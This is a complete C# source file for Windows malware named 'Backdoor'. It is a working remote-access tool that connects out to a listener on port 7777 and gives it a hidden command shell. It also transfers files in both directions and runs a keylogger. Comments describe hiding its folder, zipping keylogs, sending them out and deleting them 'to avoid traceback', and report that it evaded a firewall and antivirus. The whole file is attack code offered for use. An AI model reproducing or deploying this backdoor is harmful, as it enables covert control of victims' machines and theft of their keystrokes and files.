using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Ionic.Zip;
using Ionic.Zlib;
using NetKeyLogger;

namespace Backdoor
{
	/// <summary>
	/// Creates a backdoor that connects to an always-on listener on Port 7777 over a TCP connection. The backdoor gives the listener access to a command line interface. Furthermore, the backdoor allows the listener to give and take files to/from the infected machine. The backdoor will run completely silently to avoid detection.
	/// </summary>
	/// 
	/// <remarks>
	/// The backdoor may trigger a Windows firewall or other antivirus warnings. Empirically, the backdoor has circumvented the Windows firewall and the Avast antivirus issued a warning. Neither attempted to shut down the backdoor program.
	/// </remarks>
	class Backdoor
	{
		/// <summary> Port that the remote listener is listening on </summary>
		private const int Port = 7777;

		/// <summary> Allow the TCP socket to receive a maximum of 512KB of data at a time </summary>
		private const int BufferSize = 512*1024;

		/// <summary> Hidden folder used to store key logs and config file </summary>
		private static readonly string AppFilePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Temp";

		/// <summary> IP address used to contact the remote listener </summary>
		private static IPAddress _listenerAddress;

		/// <summary> TCP Client that handles the remote connection </summary>
		private static TcpClient _client;

		/// <summary> Direct access to underlying TCP socket </summary>
		private static Socket _socket;

		/// <summary> Process used to supply command line interface to remote listener </summary>
		private static Process _process;

		/// <summary> Key logger </summary>
		private static Keylogger _keyLogger;

		/// <summary>
		/// Main entry point for the Backdoor program
		/// </summary>
		private static void Main()
		{
			CreateAppDataFolder();
			CreateLogsFolder();
			CreateConfigFile();

			InitProcess();
			InitKeyLogger();

			bool running = true;
			while (running) {
				try {
					Connect();

					bool listening = true;
					while (listening) {
						byte[] data = new byte[BufferSize];
						int bytes = Receive(data);
						string command = Decode(data, bytes).ToLower();

						if (command.Equals("exit")) {
							listening = false;
							running = false;
						}
						else if (command.Equals("change ip")) {
							ChangeIp();
							listening = false;
						}
						else if (command.Equals("give")) {
							ReceiveRemotFile();
						}
						else if (command.Equals("get")) {
							SendLocalFile();
						}
						else if (command.Equals("keylogger logs")) {
							SendKeylogs();
						}
						else if (command.Equals("keylogger start")) {
							StartKeylogger();
						}
						else if (command.Equals("keylogger stop")) {
							StopKeylogger();
						}
						else {
							_process.StandardInput.WriteLine(command);
						}
					}
					_client.Close();
				}
				catch (Exception) {
					// ignored
				}
				_client.Close();
			}
		}

		/// <summary>
		/// Creates a folder in %AppData%/ called Temp to store data files for the Backdoor. The Temp folder is hidden
		/// </summary>
		private static void CreateAppDataFolder()
		{
			if (!Directory.Exists(AppFilePath)) {
				Directory.CreateDirectory(AppFilePath);
				Process p = new Process() {
					StartInfo = new ProcessStartInfo("cmd.exe") {
						Arguments = "/C attrib +s +h " + AppFilePath, // Make the folder hidden
						CreateNoWindow = true,
						WindowStyle = ProcessWindowStyle.Hidden,
						UseShellExecute = false
					}
				};
				p.Start();
			}
		}

		/// <summary>
		/// Creates a folder in %AppData%/Temp/ to store key log files
		/// </summary>
		private static void CreateLogsFolder()
		{
			if (!Directory.Exists(AppFilePath + "/logs")) {
				Directory.CreateDirectory(AppFilePath + "/logs");
			}
		}

		/// <summary>
		/// Creates a file in %AppData%/Temp/ called config that stores the IP address used to connect to the listener. If the file does not exist, it is initialized with the loopback address.
		/// </summary>
		private static void CreateConfigFile()
		{
			if (!File.Exists(AppFilePath + "/config.txt")) {
				File.WriteAllText(AppFilePath + "/config.txt", "127.0.0.1");
			}
		}

		/// <summary>
		/// Reads the IP address from the config file in %AppData%/Temp/
		/// </summary>
		/// 
		/// <returns> String representation of the IP Address </returns>
		private static string ReadIpFromConfig()
		{
			byte[] ipFileBytes = File.ReadAllBytes(AppFilePath + "/config.txt");
			string ipAddress = Decode(ipFileBytes, ipFileBytes.Length);
			return ipAddress;
		}

		/// <summary>
		/// Stops the key logger indefinitely
		/// </summary>
		private static void StopKeylogger()
		{
			_keyLogger.Flush2File(_keyLogger.LOG_FILE);
			_keyLogger.Enabled = false;
			Send(Encode("Keylogger Stopped."));
		}

		/// <summary>
		/// Restarts the key logger after being stopped
		/// </summary>
		private static void StartKeylogger()
		{
			_keyLogger.Enabled = true;
			Send(Encode("Keylogger Started."));
		}

		/// <summary>
		/// Continually attempts to connect to the remote listener over a TCP connection.
		/// </summary>
		private static void Connect()
		{
			bool connected = false;
			while (!connected) {
				try {
					_listenerAddress = IPAddress.Parse(ReadIpFromConfig());
					_client = new TcpClient();
					_client.Connect(_listenerAddress, Port);
					_socket = _client.Client;
					connected = true;
				} catch (Exception) {
					connected = false;
					Thread.Sleep(1000); // Wait 1 second before attempting to connect again
				}
			}
		}

		/// <summary>
		/// Creates a background process that provides a command line interface to the remote listener. The process is hooked into the command prompt program and is completely silent and invisible to the machine.
		/// </summary>
		private static void InitProcess()
		{

			_process = new Process() {
				StartInfo = new ProcessStartInfo()
				{
					FileName = "cmd.exe",
					RedirectStandardError = true,
					RedirectStandardInput = true,
					RedirectStandardOutput = true,
					UseShellExecute = false,
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				}
			};
			_process.Start();
			_process.OutputDataReceived += ConsoleOutputHandler;
			_process.ErrorDataReceived += ConsoleErrorHandler;
			_process.BeginOutputReadLine();
		}

		/// <summary>
		/// Handles all error output from the background command line process that presents a command line interface to the remote listener
		/// </summary>
		/// 
		/// <param name="sendingProcess"> Process that sent the event </param>
		/// <param name="errorData"> Error Data Received from the sending process </param>
		private static void ConsoleErrorHandler(object sendingProcess, DataReceivedEventArgs errorData)
		{
			try {
				if (!String.IsNullOrEmpty(errorData.Data)) {
					string error = errorData.Data;
					SendStrings(SplitNewlines(error));
				}
			}
			catch (Exception) {
				// ignored
			}
		}

		/// <summary>
		/// Handles all output from the background command line process that presents a command line interface to the remote listener.
		/// </summary>
		/// 
		/// <param name="sendingProcess"> Process that sent the event </param>
		/// <param name="outData"> Output data received from the sending process </param>
		private static void ConsoleOutputHandler(object sendingProcess, DataReceivedEventArgs outData)
		{
			try {
				if (!String.IsNullOrEmpty(outData.Data)) {
					string output = outData.Data;
					if (output.Contains("Microsoft Windows") || output.Contains("Microsoft Corporation")) {
						return;
					}

					SendStrings(SplitNewlines(output));
				}
			}
			catch (Exception) {
				// ignored
			}
		}

		/// <summary>
		/// Creates and Starts a Key Logger that runs in the background
		/// </summary>
		/// 
		/// <remarks>
		/// Keylogger provided open-source by Alexander Kent from http://www.codeproject.com/Articles/18890/NET-Hookless-Key-logger-Advanced-Keystroke-Mining
		/// </remarks>
		private static void InitKeyLogger()
		{
			_keyLogger = new Keylogger() {
				Enabled = true,
				FlushInterval = 50,
				LOG_FILE = AppFilePath + "/logs/" + DateTime.Now.ToString("MM-dd-yyyy"),
				LOG_MODE = "hour",
				LOG_OUT = "file"
			};
		}

		/// <summary>
		/// Initiates a transfer of all the key logs. The logs are zipped using Ionic zip library and transfered. After transferred, the logs and zip files are deleted to avoid traceback.
		/// </summary>
		/// 
		/// <remarks>
		/// The Ionic zip library was obtained open-source form https://dotnetzip.codeplex.com
		/// </remarks>
		private static void SendKeylogs()
		{
			string[] paths = Directory.GetFiles(AppFilePath + "/logs");
			int sent = 0;

			foreach (string path in paths) {
				sent++;
				string zipsPath = AppFilePath + "/logs/zips";
				Directory.CreateDirectory(zipsPath);
				string fileName = Path.GetFileNameWithoutExtension(path);
				ZipFile zipFile = new ZipFile() {
					Name = fileName + ".zip",
					CompressionLevel = CompressionLevel.BestCompression,
				};
				zipFile.AddFile(path, "");

				string zipFilePath = zipsPath + "/" + zipFile.Name;
				zipFile.Save(zipFilePath);

				byte[] zipFileBytes = File.ReadAllBytes(zipFilePath);
				string transferMessage = "|-- Transfer " + sent + " of " + paths.Length + ": " + zipFilePath + " | " + Path.GetFileNameWithoutExtension(zipFilePath) + " | " + zipFileBytes.Length + " bytes";
				Send(Encode(transferMessage));
				Send(zipFileBytes);
				File.Delete(path);
				File.Delete(zipFilePath);
				Directory.Delete(zipsPath);
			}
		}

		/// <summary>
		/// Initiates a file transfer that receives a file from the remote listener.
		/// </summary>
		private static void ReceiveRemotFile()
		{
			byte[] giveData = new byte[BufferSize];
			int giveBytes = Receive(giveData);

			string giveMessage = Decode(giveData, giveBytes); // Initialization message
			if (giveMessage.ToLower().Equals("error")) {
				return;
			}
			string[] parsedGiveMessage = giveMessage.Split(new[] { " | " }, StringSplitOptions.None);
			string filePath = parsedGiveMessage[0];
			int expectedBytes = Convert.ToInt32(parsedGiveMessage[1]);
			int receivedBytes = 0;

			byte[] fileBytes = new byte[expectedBytes];
			while (receivedBytes < expectedBytes) { // Loop until all the bytes have been received
				giveBytes = Receive(giveData);
				receivedBytes += giveBytes;
				for (int i = 0; i < giveBytes; i++) {
					fileBytes[i] = giveData[i];
				}
			}
			
			try {
				File.WriteAllBytes(filePath, fileBytes);
				Send(Encode("File Saved to " + filePath));
			} catch (Exception fileWriteException) {
				Send(Encode("Error: " + fileWriteException.Message));
			}
		}

		/// <summary>
		/// Initiates a transfer that sends a file from the machine to the remote listener.
		/// </summary>
		private static void SendLocalFile()
		{
			byte[] getData = new byte[BufferSize];
			int getBytes = Receive(getData);
			string filePath = Decode(getData, getBytes);
			try {
				byte[] fileBytes = File.ReadAllBytes(filePath);
				Send(Encode(fileBytes.Length.ToString())); // Sends the Initialization string
				Thread.Sleep(50);
				Send(fileBytes); // Sends the bytes of the file
			} catch (Exception fileReadException) {
				Send(Encode(fileReadException.Message));
			}
		}

		/// <summary>
		/// Changes the IP address used to connect to the remote listener. The IP address is written as a string into the %AppData%/Temp/config.txt file. If the change was successful, the backdoor closes the current conncetion and beings attempting to connect on the new address.
		/// </summary>
		/// 
		/// <remarks>
		/// This method can result in an orphaned Backdoor if the address supplied does not have a listener running on it.
		/// </remarks>
		private static void ChangeIp()
		{
			byte[] ipData = new byte[BufferSize];
			int ipBytes = Receive(ipData);
			string newIpString = Decode(ipData, ipBytes);
			try {
				File.WriteAllText(AppFilePath + "/config.txt", newIpString);
				Send(Encode("IP Address Successfully Changed. Reconnecting on New Address."));
				_client.Close();
			} catch (FormatException ipFormatException) {
				Send(Encode(ipFormatException.Message));
			}
		}

		/// <summary>
		/// Splits a string into an array of strings split at the newline character.
		/// </summary>
		/// 
		/// <param name="largeString"> String containing new line characters </param>
		/// 
		/// <returns> Array of strings without new line characters </returns>
		private static string[] SplitNewlines(string largeString)
		{
			return largeString.Split(new[] {Environment.NewLine}, StringSplitOptions.None);
		}

		/// <summary>
		/// Uses the underlying TCP socket to send the provided bytes. After sending, the backdoor sleeps for 50 milliseconds to prevent data collisions.
		/// </summary>
		/// 
		/// <param name="data"> Bytes to be sent over the socket </param>
		private static void Send(byte[] data)
		{
			_socket.Send(data);
			Thread.Sleep(50);
		}

		/// <summary>
		/// Sends a series of strings through the socket.
		/// </summary>
		/// 
		/// <param name="strings"> Array of strings to be sent </param>
		/// 
		/// <remarks>
		/// This method is used in conjunction with SplitNewLines in order to compensate for new line characters over the TCP connection. For unknown reasons, new lines were not being received properly across the TCP socket. This provides a work-around.
		/// </remarks>
		private static void SendStrings(string[] strings)
		{
			foreach (string s in strings) {
				Send(Encode(s));
			}
		}

		/// <summary>
		/// Wrapper around the TCP socket receive method
		/// </summary>
		/// 
		/// <param name="var"> Byte array variable used to store the received bytes </param>
		/// 
		/// <returns></returns>
		private static int Receive(byte[] var)
		{
			return _socket.Receive(var);
		}


		/// <summary>
		/// Encodes a string into an array of bytes with UTF-8 Encoding
		/// </summary>
		/// 
		/// <param name="str"> String to convert to bytes </param>
		/// 
		/// <returns> Bytes representing the string with UTF-8 Encoding </returns>
		private static byte[] Encode(string str)
		{
			return Encoding.UTF8.GetBytes(str);
		}

		/// <summary>
		/// Decodes an array of bytes into a string with UTF-8 Encoding
		/// </summary>
		/// 
		/// <param name="data"> Bytes to be converted to a string </param>
		/// <param name="length"> Number of bytes that should be decoded </param>
		/// 
		/// <returns> String representing the bytes with UTF-8 Encoding </returns>
		private static string Decode(byte[] data, int length)
		{
			return Encoding.UTF8.GetString(data, 0, length);
		}
	}
}